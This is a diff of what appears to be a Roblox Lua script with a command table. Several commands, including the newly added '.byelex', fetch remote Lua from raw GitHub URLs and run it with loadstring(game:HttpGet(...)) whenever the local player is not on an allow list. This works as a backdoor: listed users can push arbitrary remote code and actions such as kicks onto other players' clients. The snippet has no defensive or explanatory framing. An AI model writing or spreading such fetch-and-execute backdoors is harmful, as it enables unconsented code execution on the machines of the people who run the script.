@@ -10585,11 +10585,6 @@ local commands = {
 			end
 		end
 	end,
-	[".why"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/ProReleased/ProReleased/main/Why"))()
-		end
-	end,
 	[".kick"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			wait(1)
@@ -10603,9 +10598,14 @@ local commands = {
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/ProReleased/ProReleased/main/Rick"))()
 		end
 	end,
-	[".xylex"] = function()
+	[".chip"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/ProReleased/ProReleased/main/Chip"))()
+		end
+	end,
+	[".byelex"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/ProReleased/ProReleased/main/Byelex"))()
 		end
 	end,
 	[".freeze"] = function()
